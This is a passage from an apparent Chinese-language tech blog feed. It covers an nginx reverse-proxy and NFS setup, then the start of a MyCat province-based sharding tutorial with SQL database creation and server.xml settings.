class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cat</span> /usr/local/nginx/conf/user/proxy.conf </span><br><span class="line">server {</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">listen</span> &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="number">80</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">server_name</span> &#xA0;www.uplookinglinux.com;</span><br><span class="line">&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">charset</span> utf-<span class="number">8</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">access_log</span> &#xA0;/var/log/nginx/proxy.access.log &#xA0;main;</span><br><span class="line">&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="comment">#################################################</span></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_connect_timeout</span> <span class="number">30</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_send_timeout</span> <span class="number">30</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_read_timeout</span> <span class="number">30</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_buffer_size</span> &#xA0;<span class="number">64k</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_buffers</span> <span class="number">4</span> <span class="number">64k</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_busy_buffers_size</span> <span class="number">128k</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_temp_file_write_size</span> <span class="number">128k</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="comment">#uri &#x5339;&#x914D; .php &#x6216;&#x8005; .php5 &#x7ED3;&#x5C3E;</span></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">location</span> <span class="regexp">~ \.(php|php5)$</span> {</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">root</span> &#xA0;&#xA0;/var/www/web;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="comment">#&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230; phpServer&#x96C6;&#x7FA4;</span></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_pass</span> &#xA0;phpServer;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">include</span> &#xA0;&#xA0;fastcgi_params;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;}</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="comment">#&#x5339;&#x914D;&#x6839;&#x76EE;&#x5F55;&#xFF0C;&#x56E0;&#x4E3A;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x4E3B;&#x9875;&#x4E3A;index.php&#x52A8;&#x6001;&#x9875;&#x9762;</span></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">location</span> = / {</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">root</span> &#xA0;&#xA0;/var/www/web;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="comment">#&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230; phpServer&#x96C6;&#x7FA4;</span></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_pass</span> &#xA0;phpServer;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">include</span> &#xA0;&#xA0;fastcgi_params;</span><br><span class="line">&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;}</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="comment">#################################################</span></span><br><span class="line">&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">location</span> / {</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="comment">#&#x8BBE;&#x7F6E;&#x4F2A;&#x9759;&#x6001;&#x8F6C;&#x53D1;&#x89C4;&#x5219;</span></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">if</span> (!-e <span class="variable">$request_filename</span>) {</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">rewrite</span> <span class="regexp">&#xA0;^(.*)$</span> &#xA0;/index.php?s=/<span class="variable">$1</span> &#xA0;<span class="literal">last</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;break;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;}</span><br><span class="line">&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">root</span> &#xA0;&#xA0;/var/www/web;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">index</span> &#xA0;index.html index.htm;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">proxy_pass</span> http://webServer;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">proxy_set_header</span> X-Real-IP &#xA0;<span class="variable">$remote_addr</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">proxy_set_header</span> X-Forwarded-For &#xA0;&#xA0;<span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">proxy_connect_timeout</span> <span class="number">30</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">proxy_send_timeout</span> <span class="number">15</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="attribute">proxy_read_timeout</span> <span class="number">15</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;}</span><br><span class="line">}</span><br><span class="line"><span class="attribute">yum</span> install -y nfs-utils</span><br><span class="line">mkdir -p /var/www/web</span><br><span class="line">chown nobody:nobody /var/www/web/</span><br><span class="line">mount -tnfs <span class="number">192.168.110.17</span>:/webData /var/www/web/</span><br><span class="line">echo -e <span class="string">&quot;192.168.10.17:/webData\t/var/www/web\tnfs\tdefaults\t0 0&quot;</span> &gt;&gt; /etc/fstab</span><br><span class="line">mount -a</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;9&amp;#x53F0;&amp;#x673A;&amp;#x5668;IP&amp;#x5730;&amp;#x5740;&amp;#x5206;&amp;#x914D;&amp;#xFF08;&amp;#x9759;&amp;#x6001;&amp;#xFF09;&amp;#xFF1A;&lt;/strong&gt;&amp;#xFF1A;&lt;br&gt;&lt;code&gt;192
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MyCat教程全国省份分片枚举操作</title>
    <link href="https://marnm.github.io//posts/8f74b0e7/"/>
    <id>https://marnm.github.io//posts/8f74b0e7/</id>
    <published>2022-06-07T04:46:57.000Z</published>
    <updated>2022-06-07T05:10:40.226Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MyCat&#x5206;&#x7247;&#x679A;&#x4E3E;&#x64CD;&#x4F5C;&#x2014;&#x2014;&#x5168;&#x56FD;&#x7701;&#x4EFD;&#x5206;&#x7247;"><a href="#MyCat&#x5206;&#x7247;&#x679A;&#x4E3E;&#x64CD;&#x4F5C;&#x2014;&#x2014;&#x5168;&#x56FD;&#x7701;&#x4EFD;&#x5206;&#x7247;" class="headerlink" title="MyCat&#x5206;&#x7247;&#x679A;&#x4E3E;&#x64CD;&#x4F5C;&#x2014;&#x2014;&#x5168;&#x56FD;&#x7701;&#x4EFD;&#x5206;&#x7247;"></a>MyCat&#x5206;&#x7247;&#x679A;&#x4E3E;&#x64CD;&#x4F5C;&#x2014;&#x2014;&#x5168;&#x56FD;&#x7701;&#x4EFD;&#x5206;&#x7247;</h1><p><strong>&#x673A;&#x5668;</strong></p><table><thead><tr><th>IP</th><th>&#x7CFB;&#x7EDF;</th><th>&#x89D2;&#x8272;</th></tr></thead><tbody><tr><td>192.168.73.20</td><td>CentOS 7.4</td><td>MyCat Server</td></tr><tr><td>192.168.73.21</td><td>RHEL 7.3</td><td>MySQL Server 5.7</td></tr><tr><td>192.168.73.22</td><td>CentOS 7.4</td><td>MySQL Server 5.7</td></tr><tr><td>192.168.73.23</td><td>RHEL 7.3</td><td>MySQL Server 5.7</td></tr></tbody></table><h3 id="&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;"><a href="#&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;" class="headerlink" title="&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;"></a>&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;</h3><p><strong>192.168.73.21</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> jakingtestdb01;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> jakingtestdb02;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> jakingtestdb03;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb01 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb02 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb03 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb04 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb05 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb06 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb07 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb08 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb09 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb10 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb11 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb12 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>192.168.73.22</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> jakingtestdb04;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> jakingtestdb05;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> jakingtestdb06;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb13 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb14 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb15 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb16 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb17 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb18 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb19 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb20 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb21 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb22 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb23 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb24 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>192.168.73.23</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> jakingtestdb07;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> jakingtestdb08;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> jakingtestdb09;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb25 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb26 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb27 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb28 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb29 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb30 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb31 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb32 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb33 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb34 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb35 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8; </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jakingtestdb36 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x914D;&#x7F6E;MyCat&#x670D;&#x52A1;"><a href="#&#x914D;&#x7F6E;MyCat&#x670D;&#x52A1;" class="headerlink" title="&#x914D;&#x7F6E;MyCat&#x670D;&#x52A1;"></a>&#x914D;&#x7F6E;MyCat&#x670D;&#x52A1;</h3><p><code>server.xml</code></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- - - Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">        - you may not use this file except in compliance with the License. - You</span></span><br><span class="line"><span class="comment">        may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">        - - Unless required by applicable law or agreed to in writing, software -</span></span><br><span class="line"><span class="comment">        distributed under the License is distributed on an &quot;AS IS&quot; BASIS, - WITHOUT</span></span><br><span class="line"><span class="comment">        WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the</span></span><br><span class="line"><span class="comment">        License for the specific language governing permissions and - limitations</span></span><br><span class="line"><span class="comment">        under the License. --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE mycat:server SYSTEM &quot;server.dtd&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mycat:server</span> <span class="attr">xmlns:mycat</span>=<span class="string">&quot;http://io.mycat/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">system</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;nonePasswordLogin&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span> <span class="comment">&lt;!-- 0&#x4E3A;&#x9700;&#x8981;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x3001;1&#x4E3A;&#x4E0D;&#x9700;&#x8981;&#x5BC6;&#x7801;&#x767B;&#x9646; ,&#x9ED8;&#x8BA4;&#x4E3A;0&#xFF0C;&#x8BBE;&#x7F6E;&#x4E3A;1&#x5219;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x9ED8;&#x8BA4;&#x8D26;&#x6237;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useHandshakeV10&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useSqlStat&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span>  <span class="comment">&lt;!-- 1&#x4E3A;&#x5F00;&#x542F;&#x5B9E;&#x65F6;&#x7EDF;&#x8BA1;&#x3001;0&#x4E3A;&#x5173;&#x95ED; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useGlobleTableCheck&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span>  <span class="comment">&lt;!-- 1&#x4E3A;&#x5F00;&#x542F;&#x5168;&#x52A0;&#x73ED;&#x4E00;&#x81F4;&#x6027;&#x68C0;&#x6D4B;&#x3001;0&#x4E3A;</span></span><br><span class="line"><span class="comment">&#x5173;&#x95ED; --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sqlExecuteTimeout&quot;</span>&gt;</span>300<span class="tag">&lt;/<span class="name">property</span>&gt;</span>  <span class="comment">&lt;!-- SQL &#x6267;&#x884C;&#x8D85;&#x65F6; &#x5355;&#x4F4D;:&#x79D2;--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sequnceHandlerType&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;sequnceHandlerPattern&quot;&gt;(?:(\s*next\s+value\s+for\s*MYCATSEQ_(\w+))(,|\)|\s)*)+&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&#x5FC5;&#x987B;&#x5E26;&#x6709;MYCATSEQ_&#x6216;&#x8005; mycatseq_&#x8FDB;&#x5165;&#x5E8F;&#x5217;&#x5339;&#x914D;&#x6D41;&#x7A0B; &#x6CE8;&#x610F;MYCATSEQ_&#x6709;&#x7A7A;&#x683C;&#x7684;&#x60C5;&#x51B5;--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sequnceHandlerPattern&quot;</span>&gt;</span>(?:(\s*next\s+value\s+for\s*MYCATSEQ_(\w+))(,|\)|\s)*)+<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;subqueryRelationshipCheck&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">property</span>&gt;</span> <span class="comment">&lt;!-- &#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x5B58;&#x5728;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x7684;&#x60C5;&#x51B5;&#x4E0B;,&#x68C0;&#x67E5;&#x5173;&#x8054;&#x5B57;&#x6BB5;&#x4E2D;&#x662F;&#x5426;&#x6709;&#x5206;&#x7247;&#x5B57;&#x6BB5; .&#x9ED8;&#x8BA4; false --&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--  &lt;property name=&quot;useCompression&quot;&gt;1&lt;/property&gt;--&gt;</span> <span class="comment">&lt;!--1&#x4E3A;&#x5F00;&#x542F;mysql&#x538B;&#x7F29;&#x534F;&#x8BAE;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  &lt;property name=&quot;fakeMySQLVersion&quot;&gt;5.6.20&lt;/property&gt;--&gt;</span> <span class="comment">&lt;!--&#x8BBE;&#x7F6E;&#x6A21;&#x62DF;&#x7684;MySQL&#x7248;&#x672C; &#x53F7;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;property name=&quot;processorBufferChunk&quot;&gt;40960&lt;/property&gt; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        &lt;property name=&quot;processors&quot;&gt;1&lt;/property&gt;</span></span><br><span class="line"><span class="comment">        &lt;property name=&quot;processorExecutor&quot;&gt;32&lt;/property&gt;</span></span><br><span class="line"><span class="comment">         --&gt;</span></span><br><span class="line">        <span 